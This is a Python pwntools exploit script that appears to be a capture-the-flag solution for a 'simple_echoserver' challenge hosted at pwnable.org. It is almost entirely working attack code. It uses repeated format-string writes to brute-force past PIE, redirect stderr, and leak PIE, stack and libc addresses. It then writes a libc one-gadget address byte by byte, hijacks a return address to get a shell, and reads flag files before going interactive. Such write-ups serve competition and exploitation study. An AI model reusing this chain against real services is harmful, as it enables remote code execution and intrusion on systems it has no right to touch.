# -*- coding: future_fstrings -*-

from pwn import *

DEBUG = False

binary = ELF('./simple_echoserver')
libc = ELF('./libc-2.27.so')

context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def init_audit(p, name, phone):
    p.sendlineafter("Your name: ", name)
    p.sendlineafter("Your phone: ", str(phone))

if __name__ == "__main__":
    while True:
        try:
            if DEBUG:
                p = process("./simple_echoserver", stderr=open('/dev/null', 'w+b'))
            else:
                p = remote("pwnable.org", 12020)

            # saved rbp at 7$, rbp points to 43$
            # copy PIE lower 2 bytes to argc (leak) & overwrite sub_141D retaddr to restart
            #  => bypass PIE 1/16 bruteforce!
            # prob 1/16 (assume &43$ & 0xff == 0x80)
            name  = f"%c%c%c%c%c%{0x88-0xd-5}c%hhn"  # used 7, printed 0x88
            name += f"{'%c'*24}%{0x12a-0xa0}c%hhn"   # used 33, printed 0x12a
            name += f"{'%c'*4}%{0x10000-0x12e}c%hn"  # used 39, printed 0x10000
            name += f"{'%c'*2}%{0xbf-2}c%hhn"        # used 43, printed 0x100bf
            name += f"%*32$c%{0x20000-(0x100bf+0xe0+0x120)}c%45$hn"  # positional, printed 0x20000+(&stderr@bss&0xffff)
            name = name.ljust(0xe0, 'A')
            init_audit(p, name, 1234)
            if not p.recvuntil('Now enjoy yourself!', timeout=0.2 if DEBUG else 1):  # empty if wrong offset (timed out)
                raise EOFError
            p.sendline("~.")
            
            # check that we've successfully returned
            p.recvuntil("For audit, please provide your name and phone number: ")
            
            # use a stray PIE over working stack location to prepare stderr pointer
            # note that sub_141D retaddr overwriting gadget is already prepared as rbp of main
            # prob 13/16 (fails for 0x...d/e/f000)
            name  = f"{'%c'*31}%{0xa0-0xd-31}c%hhn"  # used 33, printed 0xa0
            name += f"%{0xbf-0xa0}c%43$hhn"          # positional, printed 0xbf
            name += f"%{0x10000-0xbf}c%*75$c%39$hn"  # positional, printed 0x10000+(&stderr@bss&0xffff)
            init_audit(p, name, 1234)
            p.recvuntil('Now enjoy yourself!')
            p.sendline("~.")

            # overwrite stderr with stdout
            # prob 1/16 (assume &stdout@libc = 0x8760)
            name  = f"%{0xbf-0xd}c%43$hhn"    # positional, printed 0xbf
            name += f"%{0x8760-0xbf}c%47$hn"  # positional, printed 0x8760
            init_audit(p, name, 1234)
            p.recvuntil('Now enjoy yourself!')  # EOFError if 13/16 PIE range assumption failed
            p.sendline("~.")

            # check stderr overwrite
            name  = f"%{0xbf-0xd}c%43$hhn"       # positional, printed 0xbf
            init_audit(p, name, 1234)
            if not p.recvuntil('[USER] name: ', timeout=0.2 if DEBUG else 1):
                raise EOFError
            p.recvuntil('Now enjoy yourself!')
            p.sendline("~.")

            # now we have fsb output, do the usuals
            name  = f"%{0xbf-0xd}c%43$hhn"       # positional, printed 0xbf
            name += "|||" + "|".join(["%6$p", "%7$p", "%12$p"]) + "|||"
            init_audit(p, name, 1234)
            p.recvuntil("|||")
            leaks = list(map(lambda d: int(d, 16), p.recvuntil("|||", drop=True).split("|")))
            p.recvuntil('Now enjoy yourself!')
            p.sendline("~.")

            binary_base = leaks[0] - 0x4160
            stack_base = leaks[1] - 0x138  # rsp at fprintf enter
            libc_base = leaks[2] - libc.symbols['_IO_2_1_stdin_']

            assert binary_base & 0xfff == 0 and libc_base & 0xfff == 0

            log.success('PIE base:      0x{:016x}'.format(binary_base))
            log.success('stack@fprintf: 0x{:016x}'.format(stack_base))
            log.success('libc base:     0x{:016x}'.format(libc_base))

            oneshot = libc_base + 0x4f322  # constraint [rsp+0x40] satisfactory
            pppr = binary_base + 0x153e

            # set i-th byte for oneshot (48$)
            for i in range(8):
                ob = (oneshot >> (8 * i)) & 0xff
                name  = f"{'%c'*31}%{0xa8+i-0xd-31}c%hhn"  # used 33, printed 0xa8+i
                name += f"%{0xbf-(0xa8+i)}c%43$hhn"        # positional, printed 0xbf
                name += f"%{0x100-0xbf+ob}c%39$hhn"        # positional, printed oneshot i-th byte
                init_audit(p, name, 1234)
                p.recvuntil('Now enjoy yourself!')
                p.sendline("~.")
            
            # set return to pppr
            name  = f"%{(pppr&0xffff)-0xd}c%43$hn"  # positional, printed 0xbf
            init_audit(p, name, 1234)
            p.recvuntil('Now enjoy yourself!')
            p.sendline("~.")

            p.sendline('cat flag; cat /flag; cat /home/flag')
            p.recvuntil('flag{', timeout=1)
            flag = 'flag{' + p.recvuntil('}', timeout=1)
            print(flag)

            p.interactive()
        except EOFError:
            p.close()
            continue
        break
